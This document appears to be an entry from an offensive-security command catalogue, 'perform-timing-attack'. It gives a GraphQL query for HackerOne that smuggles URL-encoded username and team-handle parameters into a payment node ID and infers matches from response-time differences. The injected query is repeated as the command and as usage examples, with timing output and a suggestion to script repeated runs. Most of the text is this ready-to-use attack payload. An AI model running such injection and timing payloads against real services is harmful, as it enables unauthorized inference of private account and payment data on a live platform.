---
data: >-
  query { node(id:
  "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dfransrosen%26")
  { ... on User { id } } }
tags:
  - timing
  - attack
type: command
output: 'Varied RTT: ~400ms no match, ~2000ms match; 500 error'
executor: graphql
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.593Z'
id: 10c88579-9c30-4f75-9dcc-2cdab7c6fa77
verified: false
validated: true
submitted: true
---
# perform-timing-attack

## Command

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dfransrosen%26") { ... on User { id } } }
```

## Description

Executes a GraphQL query with injected params to measure timing for match inference.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Injected param ID | Yes |

## Examples

### Basic Usage

```graphql
query { node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dfransrosen%26") { ... on User { id } } }
```

### Advanced Usage

Script multiple runs for averaging.

## Expected Output

Response time delta indicating matches.

## Related

- [[commands/enumerate-with-sitemap]]
- [[procedures/Execute-Timing-Attack-on-Payments]]
